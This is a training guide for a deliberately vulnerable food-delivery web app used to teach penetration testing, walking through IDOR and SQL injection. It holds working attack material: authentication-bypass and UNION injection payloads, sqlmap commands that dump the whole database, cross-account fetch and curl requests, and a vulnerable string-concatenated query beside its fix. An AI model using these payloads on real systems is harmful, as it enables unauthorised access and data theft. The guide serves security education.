# Manchester Fresh Foods - Student Testing Guide

## Quick Start 

This is a deliberately vulnerable B2B food delivery application created for **penetration testing education**. This is a step-by-step guide to help you with the fundamentals of web application pen-testing.

### ⚠️ Important
- This application is **ONLY for educational use** in controlled environments
- Never use these techniques on real systems without authorisation
- Document all findings professionally as you would in a real penetration test

---

## Getting Started

### Demo Accounts

Use these credentials to explore the application:

**Customer Account** (Recommended for initial exploration):
- **Username**: `thepubco`
- **Password**: `welcome123`
- **Company**: The Pub Company Ltd
- Access to: Dashboard, orders, profile, invoices

**Admin Account**:
- **Username**: `admin`
- **Password**: `admin123`
- Full administrative access

**Other Customer Accounts** (for IDOR testing):
- `bella_italia` / `pasta2024` - Bella Italia Restaurant
- `green_leaf` / `healthy1` - Green Leaf Café
- `royal_curry` / `spice99` - Royal Curry House
- `cityhotel` / `hotel2024` - Manchester City Hotel

---

## Example Vulnerability: Viewing Other Users' Orders (IDOR)

### What is IDOR?
Insecure Direct Object Reference (IDOR) occurs when an application exposes direct references to internal objects (like database IDs) without proper authorisation checks.

### How to Test This Vulnerability

#### Step 1: Login as First Customer and Capture Order IDs
1. Open **Firefox** and press **F12** to open Firefox Developer Tools
2. Go to the **Network** tab
3. Navigate to `/login` and login as **thepubco** / **welcome123**
4. Click "My Orders" in the sidebar

#### Step 2: Extract Order IDs from API Response
1. In the Network tab, find the request to `/api/orders`
2. Click on it and select the **Response** tab
3. You'll see JSON containing your 3 orders with their UUIDs:
```json
[
  {"id": "abc123-def456-...", "orderNumber": "MFF-1000", ...},
  {"id": "xyz789-uvw012-...", "orderNumber": "MFF-1001", ...},
  {"id": "pqr345-stu678-...", "orderNumber": "MFF-1002", ...}
]
```
4. **Copy one of the order IDs** (the UUID, not the order number)

#### Step 3: Logout and Login as Different Customer
1. Click **Logout** in the sidebar
2. Login as **bella_italia** / **pasta2024**
3. Navigate to "My Orders" - you'll see different orders (MFF-1003, MFF-1004, etc.)

#### Step 4: Access First Customer's Order (The IDOR Attack!)

**Method A: Using Firefox Developer Tools Console**
1. Press **F12** to open Firefox Developer Tools
2. Go to the **Console** tab
3. Run this JavaScript (paste thepubco's order UUID):
```javascript
fetch('/api/orders/PASTE_THEPUBCO_ORDER_UUID_HERE')
  .then(r => r.json())
  .then(data => console.log('STOLEN ORDER:', data))
```
4. You'll see thepubco's order details even though you're logged in as bella_italia!

**Method B: Using Burp Suite**
1. Configure Firefox to use Burp as proxy (127.0.0.1:8080)
2. In Burp, go to Proxy > Intercept
3. In Firefox, refresh the My Orders page
4. Intercept the request to `/api/orders`
5. Send to Repeater (Ctrl+R)
6. Change the URL to `/api/orders/THEPUBCO_ORDER_UUID`
7. Click Send - observe unauthorised access to another customer's order!

**Method C: Using curl**
```bash
# Get your session cookie from Firefox Developer Tools > Storage > Cookies
curl -H "Cookie: connect.sid=your-session-cookie" http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID
```

### Expected Result
✅ **Successful Exploit**: You can view orders belonging to other customers, including:
- Order details (items, quantities, prices)
- Delivery addresses
- Order notes (may contain sensitive information)
- Customer company names

### Why This is Dangerous
- **Privacy breach**: Competitors can see what other businesses are ordering
- **Business intelligence**: Order patterns reveal business strategy
- **Data protection violation**: GDPR breach exposing customer information

### Remediation
The endpoint should verify ownership:
```typescript
// SECURE VERSION
app.get("/api/orders/:id", async (req, res) => {
  const order = await storage.getOrder(req.params.id);
  if (!order) {
    return res.status(404).json({ error: "Order not found" });
  }
  
  // ✅ CHECK OWNERSHIP
  if (order.userId !== req.session.userId) {
    return res.status(403).json({ error: "Unauthorised" });
  }
  
  res.json(order);
});
```

---

## Example Vulnerability: SQL Injection Authentication Bypass

### What is SQL Injection?
SQL Injection occurs when untrusted user input is inserted into SQL queries without proper sanitisation, allowing attackers to manipulate database queries.

**⚠️ IMPORTANT**: This application now uses a **real SQLite database** with genuinely vulnerable SQL queries (not simulated). All SQL injection testing tools like SQLmap will work authentically!

### How to Test This Vulnerability

#### Method 1: Manual Testing (Easiest)

**Step 1: Navigate to Login Page**
1. Open **Firefox** and go to `/login`
2. Press **F12** to open Firefox Developer Tools > Console tab to observe any errors

**Step 2: Try Authentication Bypass Payload**
In the **username** field, enter:
```
' OR '1'='1' --
```
In the **password** field, enter anything (e.g., `anything`)

Click **Login**

**Expected Result:**
✅ **Successful Exploit**: You'll be logged in as the first user in the database (usually `admin`), completely bypassing password authentication!

**Why This Works:**
The vulnerable SQL query looks like:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
```

Breaking it down:
- `username=''` - Checks if username is empty (false)
- `OR '1'='1'` - This is always true!
- `--` - SQL comment, ignores the password check entirely

**Other Payloads to Try:**
```sql
admin'--
' OR 1=1--
' OR 'a'='a'--
admin' OR '1'='1
```

**Alternative: Using curl**
You can also verify the vulnerability using `curl` from the terminal:
```bash
curl -X POST http://<TARGETIP>:5000/api/login -H "Content-Type: application/json" -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
```

#### Method 2: Using SQLmap (Advanced)

SQLmap is a powerful automated SQL injection tool that can extract entire databases.

**Recommended Approach: Product Search Endpoint**

The product search endpoint is the simplest to test because it doesn't require authentication:

```bash
# Step 1: Detect the SQL injection vulnerability
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --batch --level=5 --risk=3 --dbms=SQLite --flush-session --technique=B --string="Organic Tomatoes"

# Step 2: List all tables in the database
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --tables --batch --dbms=SQLite --technique=B --string="Organic Tomatoes"

# Step 3: Dump all data from the database
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --dump-all --batch --dbms=SQLite --exclude-sysdbs --technique=B --string="Organic Tomatoes"
```

**What you'll extract:**
- Usernames and plaintext passwords
- Email addresses
- Company information
- User roles (admin, customer)
- All products, orders, and contact submissions

**Step 4: Analyse Results**

After running the three commands above, SQLmap will:
- ✅ **Step 1**: Detect SQL injection vulnerability (UNION query injection)
- ✅ **Step 2**: List all tables (users, products, orders, order_items, reviews, contact_submissions)
- ✅ **Step 3**: Dump all data including usernames and **plaintext passwords**!

**Expected Output from Step 1 (Detection):**
```
[INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[INFO] GET parameter 'search' is vulnerable
[INFO] the back-end DBMS is SQLite
```

**Expected Output from Step 2 (List Tables):**
```
Database: SQLite_masterdb
[6 tables]
+---------------------+
| contact_submissions |
| order_items         |
| orders              |
| products            |
| reviews             |
| users               |
+---------------------+
```

**Expected Output from Step 3 (Dump All):**
```
[INFO] fetching entries for table 'users'
Database: SQLite_masterdb
Table: users
[7 entries]
+------+----------+----------+-------+
| id   | username | password | role  |
+------+----------+----------+-------+
| ...  | admin    | admin123 | admin |
| ...  | thepubco | welcome123| customer |
...
```

**Note**: SQLmap saves all extracted data to `/root/.sqlmap/output/<TARGETIP>/` as CSV and text files.

### Product Search is Also Vulnerable!

The product search functionality is equally vulnerable:

**Step 1: Go to Products Page**
Visit `/products` (no login required!)

**Step 2: Try SQL Injection in Search**
Enter in the search box:
```
' UNION SELECT id, username, email, '', '', '', '', 0 FROM users --
```

**Expected Result:**
User accounts (including admin!) appear in the product list mixed with regular products. You'll see usernames as product names and email addresses as descriptions.

**Alternative Payload (simpler):**
For a basic test, you can also try:
```
' OR '1'='1' --
```
This returns all products (bypassing search filtering) but won't show user accounts.

### Why This is Extremely Dangerous

**Real-World Impact:**
- **Complete database compromise**: Attackers can read, modify, or delete all data
- **Authentication bypass**: Access any account without passwords
- **Data exfiltration**: Customer data, orders, financial information exposed
- **Compliance violations**: GDPR, PCI-DSS breaches
- **Reputational damage**: Customer trust destroyed
- **Financial losses**: Fines, lawsuits, business disruption

**OWASP Top 10**: A03:2021 - Injection  
**CVSS Score**: 9.8 (Critical)

### Remediation: Use Parameterised Queries

**VULNERABLE CODE (Current):**
```typescript
// ❌ DANGEROUS: String concatenation
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
const user = db.prepare(query).get();
```

**SECURE CODE (Recommended Fix):**
```typescript
// ✅ SAFE: Parameterized queries
const query = `SELECT * FROM users WHERE username=? AND password=?`;
const user = db.prepare(query).get(username, password);
```

**Additional Security Layers:**
1. **Input validation**: Whitelist allowed characters
2. **Least privilege**: Database user shouldn't have DROP/DELETE permissions
3. **WAF (Web Application Firewall)**: Detect and block SQL injection attempts
4. **Hashed passwords**: Use bcrypt (plaintext passwords are another vulnerability!)
5. **Prepared statements**: Always use parameterised queries



#### Now, go on to look at the 'additional vulnerabilities' markdown document (`ADDITIONAL.md`)
